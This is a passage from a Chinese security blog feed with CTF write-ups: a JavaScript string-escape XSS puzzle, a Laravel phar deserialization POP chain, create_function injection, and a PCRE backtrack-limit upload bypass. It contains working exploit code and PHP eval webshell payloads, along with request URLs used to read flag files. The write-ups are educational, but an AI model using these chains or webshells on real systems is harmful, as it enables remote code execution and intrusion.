js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上一题类似的题目，只是没有了多余的字符串中转，现在的反斜线就有效果了，然而没有过滤反斜线，所以这里可以用反斜线转义过滤用的那个反斜线，这样就造成字符串逃逸，随意插入语句即可。</p><p><code>\&quot;);alert(1)//</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="XSS" scheme="https://hurricane618.me/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking lumenserial 复现</title>
    <link href="https://hurricane618.me/2019/01/24/code-breaking-lumenserial/"/>
    <id>https://hurricane618.me/2019/01/24/code-breaking-lumenserial/</id>
    <published>2019-01-24T00:54:06.000Z</published>
    <updated>2019-01-24T01:29:31.967Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>php的laravel框架的审计题目。这里记录一下复现过程。整体思路是venenof7师傅的。</p><p>先来看入口，不知道他们怎么就找到了这个请求……</p><p><code>/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/</code></p><p>我在黑盒测试的时候只找到了action，完全没有source的影子，个人感觉是结合白盒测试出来的。这里对应的源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doCatchimage</span><span class="params">(Request $request)</span></span>&#123;</span><br><span class="line">$sources = $request-&gt;input(<span class="keyword">$this</span>-&gt;config[<span class="string">'catcherFieldName'</span>]);</span><br><span class="line">$rets = [];</span><br><span class="line"><span class="keyword">if</span> ($sources) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($sources <span class="keyword">as</span> $url) &#123;</span><br><span class="line">$rets[] = <span class="keyword">$this</span>-&gt;download($url);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> response()-&gt;json([</span><br><span class="line"><span class="string">'state'</span> =&gt; <span class="string">'SUCCESS'</span>,</span><br><span class="line"><span class="string">'list'</span> =&gt; $rets</span><br><span class="line">]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$maxSize = <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherMaxSize'</span>];</span><br><span class="line">        $limitExtension = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ltrim($ext, <span class="string">'.'</span>);</span><br><span class="line">        &#125;, <span class="keyword">$this</span>-&gt;config[<span class="string">'catcherAllowFiles'</span>]);</span><br><span class="line">        $allowTypes = array_map(<span class="function"><span class="keyword">function</span> <span class="params">($ext)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"image/&#123;$ext&#125;"</span>;</span><br><span class="line">        &#125;, $limitExtension);</span><br><span class="line"></span><br><span class="line">        $content = file_get_contents($url);  url为图片路径</span><br><span class="line">        $img = getimagesizefromstring($content);</span><br><span class="line">省略下面的不重要代码……</span><br></pre></td></tr></table></figure><p>这里可以看到使用了<code>file_get_contents</code>进行文件操作，同样是使用blackhat议题上的phar在文件操作时会执行反序列化操作。这里只需要寻找有<code>__destruct</code>和<code>__wakeup</code>的类。</p><p>这里全局搜索<code>__destruct</code>，可以找到一个<code>class PendingBroadcast</code>，其他的都不太能使用，要不是destruct里面没东西，就是destruct里面执行方法的对象不可控。而这个唯一一个执行方法的对象可控的，可以将执行方法的对象换成没有该方法的对象，这样就会调用<code>__call</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>搜索<code>__call</code>得到<code>Generator</code>这个类中有这个方法，并且其中的<code>__call</code>能调用<code>format</code>而这个又会调用<code>call_user_func_array</code>，这里就可以执行代码了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span><span class="params">($formatter, $arguments = array<span class="params">()</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $attributes)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format($method, $attributes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span><span class="params">($formatter)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[$formatter])) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> $provider) &#123;</span><br><span class="line"><span class="keyword">if</span> (method_exists($provider, $formatter)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters[$formatter] = <span class="keyword">array</span>($provider, $formatter);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[$formatter];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> \InvalidArgumentException(sprintf(<span class="string">'Unknown formatter "%s"'</span>, $formatter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个一开始构造的是只能执行单个函数，通过在formatters中的数组存储函数名，最后被调用，只是现在还没办法代入参数。来看看venenof7师傅的payload。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">$<span class="title">obj_1</span> = <span class="title">array</span>("<span class="title">dispatch</span>"=&gt;"<span class="title">phpinfo</span>");</span><br><span class="line">$obj_2 = <span class="keyword">new</span> Faker\Generator($obj_1);</span><br><span class="line">$obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($obj_2, <span class="number">1</span>);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里传入数组是因为<code>getFormatter</code>函数会取formatters数组中的对应方法名的值。</p><p>这里生成1.gif需要先把phar的只读改成可以写才行。具体操作把选项改成off，并且去除注释<code>phar.readonly = Off</code></p><p>然而，重命名无法成功执行……死活不行。。。手动修改ing，上传服务器，抓包拿到图片路径。</p><p>访问<code>http://51.158.73.123:8080/server/editor?action=catchimage&amp;source[]=phar:///var/www/html/upload/image/65628379e91fb1adb860f98cd9f49712/201901/23/bed4111d42fb35cfdcff.gif</code> 成功执行</p><img src="/2019/01/24/code-breaking-lumenserial/1.png"><p>我们知道了服务器的php版本是很新的7.2.12，还有一些相关的php信息。</p><p>为了解决参数问题，必须要引入其他的类，之前的<code>$this-&gt;event</code>只能引用一个参数。</p><p>还是venenof7师傅的方法，如果本身参数不能为数组的话，那就找其他实例的方法，然后在其他实例的方法中再次构造可以控制的执行函数并且参数也能控制。</p><p>这里找到的是<code>ReturnCallback</code>和<code>StaticInvocation</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReturnCallback</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">public function invoke(Invocation $invocation)&#123;</span><br><span class="line"><span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticInvocation</span> <span class="keyword">implements</span> <span class="title">Invocation</span>, <span class="title">SelfDescribing</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line">public function getParameters(): array&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;parameters;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就有可控的函数和可控的参数。</p><p>整个过程再走一遍，建议大家可以把整个过程用纸画一下，全用脑子有点难。首先，<code>$this-&gt;events</code>赋值成<code>Generator</code>实例这样就会调用<code>__call</code>执行第一个<code>call_user_func_array</code>。其次，在第一个函数执行中调用<code>invoke</code>方法，里面的callback设置成<code>file_put_contents</code>，之后invoke的参数为<code>StaticInvocation</code>的实例，实例中的有数组的参数当做invoke调用的第二个函数执行中的参数。最后就变成了任意代码执行。给一下payload。</p><h2 id="题目payload"><a href="#题目payload" class="headerlink" title="题目payload"></a>题目payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line"><span class="keyword">protected</span> $event;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line"><span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line"><span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">parameters</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parameters)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line"><span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line"><span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">$obj_para = array('/var/www/html/upload/image/618.php', '&lt;?php @eval($_GET[618]);?&gt;');</span><br><span class="line">$obj_1 = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($obj_para);</span><br><span class="line">$obj_2 = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback(<span class="string">'file_put_contents'</span>);</span><br><span class="line">$obj_3 = <span class="keyword">array</span>(<span class="string">'dispatch'</span>=&gt;<span class="keyword">array</span>($obj_2, <span class="string">'invoke'</span>));</span><br><span class="line">$obj_4 = <span class="keyword">new</span> Faker\Generator($obj_3);</span><br><span class="line">$obj = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($obj_4, $obj_1);</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'2.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'2.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'2.phar'</span>, <span class="string">'2.gif'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同样上传之后执行一下上面类似的语句就触发执行生成webshell，然后就拿flag。</p><p><code>http://51.158.73.123:8080/upload/image/618.php?618=var_dump(glob(%27/var/www/*%27));</code></p><p><code>http://51.158.73.123:8080/upload/image/618.php?618=var_dump(file_get_contents(%27/var/www/flag_larave1_b0ne%27));</code></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.venenof.com/live_CTF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.pdf" target="_blank" rel="noopener">http://www.venenof.com/live_CTF%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.pdf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;php的laravel框架的审计题目。这里记录一下复现过程。整体思路是venenof7师傅的。&lt;/p&gt;
&lt;p&gt;先来看入口，不
      
    
    </summary>
    
      <category term="技术" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
      <category term="代码审计" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>code-breaking easy部分题目writeup</title>
    <link href="https://hurricane618.me/2019/01/10/code-breaking-esay-wp/"/>
    <id>https://hurricane618.me/2019/01/10/code-breaking-esay-wp/</id>
    <published>2019-01-10T06:02:10.000Z</published>
    <updated>2019-01-10T06:45:53.933Z</updated>
    
    <content type="html"><![CDATA[<p>ph师傅的代码审计CTF题目 <code>https://code-breaking.com</code></p><h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察正则表达式可以发现正常的函数名都不行，所以很容易联想到要在函数名中加入其它字符，这道题没想到可以用<code>create_function</code>，一开始一直在想命令执行的函数，但是没有符合要求的……</p><p>想到<code>create_function</code>之后，要测试哪个字符可以使用，这里有师傅用了burp测试函数是<code>var_dump</code>来fuzz，最后fuzz出了<code>%5c</code>，就是<code>\</code>。在小密圈中师傅的解释是PHP的命名空间默认为<code>\</code> ，如果直接写<code>function_name()</code>调用相当于是用相对路径在调用函数，如果写成<code>\function_name()</code>相当于用绝对路径调用函数。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p><p>如何在create_function中执行代码呢？<code>http://blog.51cto.com/lovexm/1743442</code></p><p>这篇文章中介绍了在create_function中如何注入代码并且执行。简单来说是通过输入<code>}</code>来闭合函数，之后再注入我们想执行的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$b = create_function(<span class="string">'$a'</span>, <span class="string">"return 666;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $b;<span class="comment">//lambda_xxx</span></span><br><span class="line">$b(<span class="number">1</span>)<span class="comment">//return 666</span></span><br><span class="line"></span><br><span class="line">这个匿名函数等效于</span><br><span class="line">lambda_xxx($a)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果注入&#125;</span><br><span class="line">lambda_xxx($a)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">666</span>;&#125;<span class="keyword">eval</span>(<span class="string">"phpinfo()"</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">这样在创建匿名函数的同时会执行我们的恶意代码，这里/* 和//都是可以的</span></span><br></pre></td></tr></table></figure><p>现在能够执行代码了，剩下的就是通过执行代码寻找flag。这里套用一下LoRexxar的payload来搜索文件</p><p><code>http://51.158.75.42:8087/?action=%5ccreate_function&amp;arg=return%20666;}eval($_POST[%27618%27]);/*</code></p><p><code>618=$handle = opendir(&#39;../&#39;);while(($filename = readdir($handle)) !== false){echo $filename.&quot;&lt;br/&gt;&quot;;}</code></p><img src="/2019/01/10/code-breaking-esay-wp/1.png"><p>这样直接file_get_contents获取内容</p><p><code>618=print(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));</code></p><h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，文件内容不能有<code>&lt;?</code>，这样就意味着正常的php文件完全gg，然后也可以看到文件名不可控，这就是说没有办法用文件名传输php数据。这道题参考了ph师傅的方法。</p><p>ph师傅的方法是利用了php正则表达式的一个特性，一般的语言在正则表达式匹配的时候会有回溯操作，比如在贪婪或者非贪婪模式下，一开始匹配的内容会为最大匹配，之后会根据正则表达式的内容进行回溯调整。然而php有一个回溯的次数限制，如果超过这个限制正则表达式就会返回false，又由于php的弱类型比较，这样就会绕过if的判断。</p><p>这里有鸟哥的一篇文章介绍php正则匹配的回溯限制</p><p><a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">http://www.laruence.com/2010/06/08/1579.html</a></p><p>ph师傅的详细内容</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>这里在上传的文件中加入1000000个a就会超过回溯的次数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requestsimport iosession = requests.session()</span><br><span class="line">agent = <span class="string">'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM;'</span> \</span><br><span class="line"><span class="string">' Touch; NOKIA; Lumia 920)'</span></span><br><span class="line">headers = &#123;   </span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"51.158.75.42:8088"</span>,    </span><br><span class="line"><span class="string">"User-Agent"</span>: agent,    </span><br><span class="line"><span class="string">"Origin"</span>: <span class="string">"https://code-breaking.com/"</span>,</span><br><span class="line">&#125;</span><br><span class="line">files = &#123; </span><br><span class="line"><span class="string">'file'</span>: io.BytesIO(<span class="string">b'aaa&lt;?php eval($_POST[txt]);//'</span> + <span class="string">b'a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line">html = session.post(<span class="string">'http://51.158.75.42:8088/'</span>, headers=headers, files=files, allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">print</span> html.headers</span><br></pre></td></tr></table></figure><p>然后根据打印出来的头部信息，得到webshell的地址 <code>data/558cb3b807e236696e9e2c79295d7fee/1.php</code>，然后构造post数据执行代码，拿flag。</p><p><code>txt=$handler = opendir(&#39;../../../&#39;);while(($filename = readdir($handler)) !== flase){echo $filename.&quot;&lt;br/&gt;&quot;;}</code></p><p><code>txt=print(file_get_contents(&#39;../../../flag_php7_2_1s_c0rrect&#39;));</code></p><h2 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 